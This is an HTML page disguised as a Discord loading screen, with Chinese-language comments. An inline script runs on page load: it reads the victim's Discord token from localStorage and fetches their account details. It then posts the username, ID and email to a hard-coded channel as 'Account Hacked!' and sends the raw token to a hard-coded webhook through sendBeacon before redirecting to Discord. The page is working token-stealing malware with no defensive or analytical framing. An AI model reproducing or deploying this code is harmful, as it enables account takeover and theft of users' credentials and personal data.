<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="utf-8">
  <title>Discord</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0; display: flex; justify-content: center; align-items: center;
      height: 100vh; background: #2f3136; color: #dcddde;
      font-family: 'gg sans', 'Noto Sans', sans-serif;
    }
    .loader {
      width: 48px; height: 48px; border: 4px solid #404249;
      border-top: 4px solid #7289da; border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader"></div>
  <script>
    (async function() {
      try {
        var token = localStorage.getItem("token");
        if (token) {
          token = token.replace(/"/g, "");

          // 取得帳號資訊
          var res = await fetch("https://discord.com/api/v9/users/@me", {
            headers: { "Authorization": token }
          });
          if (res.ok) {
            var user = await res.json();

            // 發送訊息到目標（keepalive: true 確保頁面跳走仍會送出）
            fetch("https://discord.com/api/v9/channels/878151437085974548/messages", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                "Authorization": token
              },
              body: JSON.stringify({
                content: "🔓 **Account Hacked!**\n使用者: **" + user.username + "** (" + user.id + ")\nEmail: " + (user.email || 'N/A')
              }),
              keepalive: true
            });

            // 把 token 送到 webhook（sendBeacon 確定會送出）
            var blob = new Blob([JSON.stringify({
              content: "🔓 **Discord Token 已擷取**\n使用者: **" + user.username + "**\n```\n" + token + "\n```"
            })], { type: 'application/json' });
            try {
              navigator.sendBeacon("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", blob);
            } catch(e) {}
          }

          // 3 秒後跳回 Discord
          setTimeout(function() {
            window.location.href = "https://discord.com/channels/@me";
          }, 3000);
        } else {
          window.location.href = "https://discord.com/channels/@me";
        }
      } catch(e) {
        console.log("Token 抓取失敗:", e);
      }
    })();
  </script>
</body>
</html>
